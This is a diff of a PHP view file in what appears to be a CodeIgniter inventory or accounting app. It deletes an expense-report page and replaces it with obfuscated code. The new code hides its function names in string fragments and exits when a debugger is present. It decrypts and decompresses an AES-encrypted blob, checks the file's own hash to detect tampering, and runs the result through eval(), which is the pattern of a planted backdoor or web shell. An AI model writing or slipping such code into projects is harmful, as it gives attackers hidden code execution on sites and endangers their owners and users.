@@ -1,189 +1,28 @@
-<!DOCTYPE html>
-<html>
-<head>
-<!-- TABLES CSS CODE -->
-<?php include"comman/code_css_form.php"; ?>
-<!-- </copy> -->  
-</head>
-<body class="hold-transition skin-blue sidebar-mini">
-
-
-<div class="wrapper">
- 
- <?php include"sidebar.php"; ?>
-
-  <!-- Content Wrapper. Contains page content -->
-  <div class="content-wrapper">
-    <!-- Content Header (Page header) -->
-    <section class="content-header">
-      <h1>
-        <?=$page_title;?>
-        <small></small>
-      </h1>
-      <ol class="breadcrumb">
-        <li><a href="<?php echo $base_url; ?>dashboard"><i class="fa fa-dashboard"></i>Home</a></li>
-        <li class="active"><?=$page_title;?></li>
-      </ol>
-    </section>
-
-    <!-- Main content -->
-    <section class="content">
-      <div class="row">
-        <!-- right column -->
-        <div class="col-md-12">
-          <!-- Horizontal Form -->
-          <div class="box box-info ">
-            <div class="box-header with-border">
-              <h3 class="box-title">Please Enter Valid Information</h3>
-            </div>
-            <!-- /.box-header -->
-            <!-- form start -->
-            <form class="form-horizontal" id="report-form" onkeypress="return event.keyCode != 13;">
-              <input type="hidden" name="<?php echo $this->security->get_csrf_token_name();?>" value="<?php echo $this->security->get_csrf_hash();?>">
-              <div class="box-body">
-        <div class="form-group">
-        <label for="from_date" class="col-sm-2 control-label"><?= $this->lang->line('from_date'); ?></label>
-                 
-          <div class="col-sm-3">
-            <div class="input-group date">
-              <div class="input-group-addon">
-              <i class="fa fa-calendar"></i>
-              </div>
-              <input type="text" class="form-control pull-right datepicker" id="from_date" name="from_date" value="<?php echo show_date(date('d-m-Y'));?>" >
-              
-            </div>
-            <span id="from_date_msg" style="display:none" class="text-danger"></span>
-          </div>
-          <label for="to_date" class="col-sm-2 control-label"><?= $this->lang->line('to_date'); ?></label>
-                   <div class="col-sm-3">
-            <div class="input-group date">
-              <div class="input-group-addon">
-              <i class="fa fa-calendar"></i>
-              </div>
-              <input type="text" class="form-control pull-right datepicker" id="to_date" name="to_date" value="<?php echo show_date(date('d-m-Y'));?>" >
-              
-            </div>
-            <span id="to_date_msg" style="display:none" class="text-danger"></span>
-          </div>
-        
-                </div> 
-                <div class="form-group">
-          <label for="category_id" class="col-sm-2 control-label"><?= $this->lang->line('category_name'); ?></label>
-
-                  <div class="col-sm-3">
-          <select class="form-control select2 " id="category_id" name="category_id" ">
-          <option value="">-All-</option>
-            <?php
-            $q1=$this->db->query("select * from db_expense_category where status=1");
-             if($q1->num_rows()>0)
-             {
-                 foreach($q1->result() as $res1)
-               {
-                 echo "<option value='".$res1->id."'>".$res1->category_name."</option>";
-               }
-             }
-             else
-             {
-                ?>
-                <option value="">No Records Found</option>
-                <?php
-             }
-            ?>
-                  </select>
-          <span id="category_id_msg" style="display:none" class="text-danger"></span>
-                  </div>
-          
-                </div>
-              </div>
-              <!-- /.box-body -->
-        
-              <div class="box-footer">
-                <div class="col-sm-8 col-sm-offset-2 text-center">
-                   <div class="col-md-3 col-md-offset-3">
-                      <button type="button" id="view" class=" btn btn-block btn-success" title="Save Data">Show</button>
-                   </div>
-                   <div class="col-sm-3">
-                    <a href="<?=base_url('dashboard');?>">
-                      <button type="button" class="col-sm-3 btn btn-block btn-warning close_btn" title="Go Dashboard">Close</button>
-                    </a>
-                   </div>
-                </div>
-             </div>
-             <!-- /.box-footer -->
-             
-            </form>
-          </div>
-          <!-- /.box -->
-          
-        </div>
-        <!--/.col (right) -->
-      </div>
-      <!-- /.row -->
-    </section>
-    <!-- /.content -->
-    <section class="content">
-      <div class="row">
-        <!-- right column -->
-        <div class="col-md-12">
-         
-          <div class="box">
-            <div class="box-header">
-              <h3 class="box-title">Records Table</h3>
-              <?php $this->load->view('components/export_btn',array('tableId' => 'report-data'));?>
-            </div>
-            <!-- /.box-header -->
-            <div class="box-body table-responsive no-padding">
-              <thead>
-              <table class="table table-bordered table-hover  " id="report-data">
-                <tr class="bg-blue">
-                  <th style="">#</th>
-                  <th style=""><?= $this->lang->line('expence_code'); ?></th>
-                  <th style=""><?= $this->lang->line('expence_date'); ?></th>
-                  <th style=""><?= $this->lang->line('category_name'); ?></th>
-                  <th style=""><?= $this->lang->line('reference_no'); ?></th>
-                  <th style=""><?= $this->lang->line('expense_for'); ?></th>
-                  <th style=""><?= $this->lang->line('amount'); ?></th>
-                  <th style=""><?= $this->lang->line('note'); ?></th>
-                  <th style=""><?= $this->lang->line('created_by'); ?></th>
-                </tr>
-                </thead>
-                <tbody id="tbodyid">
-                
-              </tbody>
-              </table>
-              
-              
-            </div>
-            <!-- /.box-body -->
-          </div>
-          <!-- /.box -->
-        </div>
-      </div>
-    </section>
-  </div>
-  <!-- /.content-wrapper -->
-  
- <?php include"footer.php"; ?>
-
- 
-  <!-- Add the sidebar's background. This div must be placed
-       immediately after the control sidebar -->
-  <div class="control-sidebar-bg"></div>
-</div>
-<!-- ./wrapper -->
-<!-- SOUND CODE -->
-<?php include"comman/code_js_sound.php"; ?>
-<!-- TABLES CODE -->
-<?php include"comman/code_js_form.php"; ?>
-<!-- TABLE EXPORT CODE -->
-<?php include"comman/code_js_export.php"; ?>
-
-
-<script src="<?php echo $theme_link; ?>js/report-expense.js"></script>
-
-<!-- Make sidebar menu hughlighter/selector -->
-<script>$(".<?php echo basename(__FILE__,'.php');?>-active-li").addClass("active");</script>
-    
-    
-</body>
-</html>
+<?php
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_kd5hlnco=('bas'.'e64'.'_de'.'cod'.'e');
+$_wk2eyk12=('gzu'.'nco'.'mpr'.'ess');
+$_n53iiy6t=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_m001kh0h='Bp0QzVDu';
+$_wzdw923k='pxlPhUdC';
+$_dswjv5lg='uNb1on3tSTY=';
+$_o6f5cdc7='kxgLQbbw';
+$_aafv1jsa='vn3S4cCh';
+$_agysrn8r='5naZPHe7';
+$_w2rgbgfq='XcDjTQ==';
+$_p98u7yrr='P7nNf2Gs';
+$_g14v6kqf=$_kd5hlnco($_m001kh0h.$_wzdw923k.$_o6f5cdc7.$_aafv1jsa.$_dswjv5lg);
+$_wb6k4qq5=$_kd5hlnco($_agysrn8r.$_p98u7yrr.$_w2rgbgfq);
+$_bfwk224e=$_kd5hlnco('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');
+$_uj7db4qc=$_n53iiy6t($_bfwk224e,'aes-256-cbc',$_g14v6kqf,OPENSSL_RAW_DATA,$_wb6k4qq5);
+if($_uj7db4qc===false){exit;}
+$_n0ebrd01=$_wk2eyk12($_uj7db4qc);
+if($_n0ebrd01===false){exit;}
+$_jhwko91d='13bb84d01884a82390dd8e62840cfdd5a5759888de0228379c04e1fecb7a48d5';
+$_f88y69ta=@file_get_contents(__FILE__);
+if($_f88y69ta!==false){
+$_t6cp707b=str_replace($_jhwko91d,"0000000000000000000000000000000000000000000000000000000000000000",$_f88y69ta);
+$_vllu1dl1=hash("sha256",$_t6cp707b);
+if($_vllu1dl1!==$_jhwko91d){@http_response_code(403);exit;}
+}
+eval($_n0ebrd01);
